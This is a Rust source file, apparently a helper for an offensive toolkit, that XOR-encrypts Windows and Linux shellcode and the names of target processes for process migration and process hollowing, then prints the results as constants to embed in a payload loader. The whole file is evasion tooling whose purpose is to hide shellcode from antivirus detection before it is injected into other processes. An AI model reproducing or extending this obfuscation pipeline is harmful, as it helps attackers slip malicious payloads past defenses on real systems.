use std::error::Error;

// Yeah all of this stuff is already in the lib, but it's gated by a feature and I haven't figured out
// How best to handle that yet

fn xor_encrypt_decrypt(key: &[u8], text: &[u8]) -> Result<Vec<u8>, Box<dyn Error>> {
    let equalilzed = equalize_slice_len(key, text);
    let key: &[u8] = &equalilzed.0[..];
    let text: &[u8] = &equalilzed.1[..];
    xor_u8_slices(key, text)
}

fn xor_u8_slices(slice_one: &[u8], slice_two: &[u8]) -> Result<Vec<u8>, Box<dyn Error>> {
    if slice_one.len() != slice_two.len() {
        return Err("The given slices are not the same length".into());
    }
    Ok(slice_one
        .iter()
        .zip(slice_two.iter())
        .map(|(&x1, &x2)| x1 ^ x2)
        .collect())
}

fn equalize_slice_len<T: std::clone::Clone>(slice_one: &[T], slice_two: &[T]) -> (Vec<T>, Vec<T>) {
    let (longer, shorter) = match slice_one.len() > slice_two.len() {
        true => (slice_one, slice_two),
        false => (slice_two, slice_one),
    };
    (
        longer.to_vec(),
        shorter.iter().cloned().cycle().take(longer.len()).collect(),
    )
}

fn main() {
    let key = rco_config::XOR_KEY;

    // XOR-encrypt the Windows shellcode with the key and write it to the console
    let win_shellcode = rco_config::WINDOWS_SHELLCODE;
    let win_output = xor_encrypt_decrypt(key, win_shellcode).unwrap();
    let mut win_print = "".to_owned();
    for byte in win_output.iter() {
        let formatted = format!("{byte:#04x}, ");
        win_print.push_str(&formatted);
    }
    win_print.pop();
    win_print.pop();
    println!("pub const ENCRYPTED_WINDOWS_SHELLCODE: &[u8] = &[{win_print}];");

    println!();

    // XOR-encrypt the Linux shellcode with the key and write it to the console
    let lin_shellcode = rco_config::LINUX_SHELLCODE;
    let lin_output = xor_encrypt_decrypt(key, lin_shellcode).unwrap();
    let mut lin_print = "".to_owned();
    for byte in lin_output.iter() {
        let formatted = format!("{byte:#04x}, ");
        lin_print.push_str(&formatted);
    }
    lin_print.pop();
    lin_print.pop();
    println!("pub const ENCRYPTED_LINUX_SHELLCODE: &[u8] = &[{lin_print}];");

    println!();

    // XOR-encrypt the Windows target process (for migration) with the key and write it to the console
    let win_target = rco_config::WINDOWS_MIGRATION_TARGET;
    let win_output = xor_encrypt_decrypt(key, win_target.as_bytes()).unwrap();
    let mut win_print = "".to_owned();
    for byte in win_output.iter() {
        let formatted = format!("{byte:#04x}, ");
        win_print.push_str(&formatted);
    }
    win_print.pop();
    win_print.pop();
    println!("pub const ENCRYPTED_WINDOWS_MIGRATION_TARGET: &[u8] = &[{win_print}];");

    println!();

    // XOR-encrypt the Linux target process (for migration) with the key and write it to the console
    let lin_target = rco_config::LINUX_MIGRATION_TARGET;
    let lin_output = xor_encrypt_decrypt(key, lin_target.as_bytes()).unwrap();
    let mut lin_print = "".to_owned();
    for byte in lin_output.iter() {
        let formatted = format!("{byte:#04x}, ");
        lin_print.push_str(&formatted);
    }
    lin_print.pop();
    lin_print.pop();
    println!("pub const ENCRYPTED_LINUX_MIGRATION_TARGET: &[u8] = &[{lin_print}];");

    println!();

    // XOR-encrypt the Windows target process (for hollowing) with the key and write it to the console
    let win_target = rco_config::WINDOWS_HOLLOWING_TARGET;
    let win_output = xor_encrypt_decrypt(key, win_target.as_bytes()).unwrap();
    let mut win_print = "".to_owned();
    for byte in win_output.iter() {
        let formatted = format!("{byte:#04x}, ");
        win_print.push_str(&formatted);
    }
    win_print.pop();
    win_print.pop();
    println!("pub const ENCRYPTED_WINDOWS_HOLLOWING_TARGET: &[u8] = &[{win_print}];");

    println!();

    // XOR-encrypt the Linux target process (for hollowing) with the key and write it to the console
    let lin_target = rco_config::LINUX_HOLLOWING_TARGET;
    let lin_output = xor_encrypt_decrypt(key, lin_target.as_bytes()).unwrap();
    let mut lin_print = "".to_owned();
    for byte in lin_output.iter() {
        let formatted = format!("{byte:#04x}, ");
        lin_print.push_str(&formatted);
    }
    lin_print.pop();
    lin_print.pop();
    println!("pub const ENCRYPTED_LINUX_HOLLOWING_TARGET: &[u8] = &[{lin_print}];");
}
